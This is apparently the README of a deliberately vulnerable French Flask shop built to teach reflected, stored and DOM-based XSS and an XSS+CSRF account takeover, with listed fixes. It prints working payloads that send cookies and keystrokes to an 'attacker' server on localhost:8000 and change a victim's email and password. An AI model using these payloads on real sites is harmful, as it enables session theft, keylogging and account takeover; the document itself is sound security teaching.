# ShopTech — Démonstration XSS multi-niveaux

> Application Flask e-commerce **volontairement vulnérable**, conçue pour démontrer les 3 types de XSS et une chaîne d'attaque XSS+CSRF complète, avec leurs défenses respectives.

**Contexte OWASP :** [A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/) · [A01:2021 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

> ⚠️ **Avertissement** : Ce projet est un outil pédagogique. Ne jamais déployer en production ni l'utiliser contre des systèmes tiers.

---

## Vulnérabilités démontrées

| # | Type | Endpoint | Payload exemple |
|---|------|----------|-----------------|
| 1 | **Reflected XSS** | `/search?q=` | `<script>alert('XSS')</script>` |
| 2 | **Stored XSS** | `/product/<id>` (avis clients) | 4 niveaux — voir ci-dessous |
| 3 | **DOM-based XSS** | `/profile#<payload>` | `<img src=x onerror="alert(1)">` |
| 4 | **Chaîne XSS+CSRF** | `/product/<id>` → `/account/*` | Prise de contrôle de compte |

### Payloads Stored XSS (4 niveaux)

```
Niveau 1 — Proof of concept
<script>alert("XSS — cookie: " + document.cookie)</script>

Niveau 2 — Vol de cookie silencieux
<script>new Image().src="http://localhost:8000/steal?c="+document.cookie+"&src=stored"</script>

Niveau 3 — Keylogger persistant (capture toutes les pages, y compris /checkout)
<script>var kl='document.addEventListener("keypress",function(e){new Image().src="http://localhost:8000/steal?k="+encodeURIComponent(e.key)+"&src="+location.pathname})';localStorage.setItem("__ks",kl);eval(kl)</script>

Niveau 4 — Chaîne XSS+CSRF (prise de contrôle de compte)
<script>fetch("/account/change-email",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:"attaquant@evil.com"}),credentials:"include"});fetch("/account/change-password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({password:"hacked123"}),credentials:"include"})</script>
```

### DOM-based XSS — particularité

Le payload ne transite **jamais par le serveur** : logs vierges, WAF contourné.

```
http://localhost:5000/profile#<img src=x onerror="new Image().src='http://localhost:8000/steal?c='+document.cookie">
```

---

## Architecture

```
shoptech/
├── app.py                  # Serveur Flask vulnérable (port 5000)
├── attacker_server.py      # Dashboard attaquant (port 8000)
├── templates/
│   ├── base.html           # Layout + mécanisme persistance keylogger
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   ├── search.html         # Reflected XSS
│   ├── product.html        # Stored XSS + CSRF
│   ├── profile.html        # DOM-based XSS
│   └── checkout.html       # Cible du keylogger (formulaire bancaire)
├── .env                    # SECRET_KEY Flask (non commité)
├── .gitignore
└── requirements.txt
```

---

## Prérequis

- Python 3.10+
- pip

---

## Installation

```bash
git clone https://github.com/<username>/xss-demo-shoptech.git
cd xss-demo-shoptech

python -m venv .venv
# Windows
.venv\Scripts\activate
# macOS / Linux
source .venv/bin/activate

pip install -r requirements.txt
```

---

## Lancement

```bash
# Terminal 1 — Application ShopTech
python app.py
# → http://localhost:5000

# Terminal 2 — Dashboard attaquant
python attacker_server.py
# → http://localhost:8000/dashboard
```

### Comptes de démonstration

| Utilisateur | Mot de passe |
|-------------|--------------|
| alice       | password     |
| bob         | password     |
| admin       | admin123     |

---

## Scénario de démonstration

1. **Ouvrir** le dashboard attaquant : `http://localhost:8000/dashboard`
2. **Se connecter** sur ShopTech en tant qu'`alice`
3. **Poster** un avis malveillant sur un produit (payload niveau 2 ou 3)
4. **Ouvrir un onglet victime** (ou demander à quelqu'un d'ouvrir la fiche produit)
5. Regarder le cookie (ou les keystrokes) apparaître **en temps réel** sur le dashboard
6. Avec le payload niveau 4 : tenter de se reconnecter → compte compromis

---

## Défenses implémentées

Chaque vulnérabilité est accompagnée de sa correction dans les commentaires du code.

| Attaque | Défense | Localisation |
|---------|---------|--------------|
| Reflected XSS | `html.escape()` / supprimer `\| safe` | `search.html` + `app.py` |
| Stored XSS | `bleach.clean(content, tags=[], strip=True)` | `app.py` route `/product` POST |
| DOM-based XSS | Remplacer `innerHTML` par `textContent` | `profile.html` |
| Vol de cookie | `SESSION_COOKIE_HTTPONLY = True` | `app.py` config |
| CSRF | Token anti-CSRF en session | `app.py` endpoints `/account/*` |
| Toutes | Content Security Policy header | `app.py` after_request |

---

## Références

- [OWASP Top 10 — A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP Top 10 — A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Analyse Magecart / British Airways — RiskIQ](https://www.riskiq.com/blog/labs/magecart-british-airways-breach/)
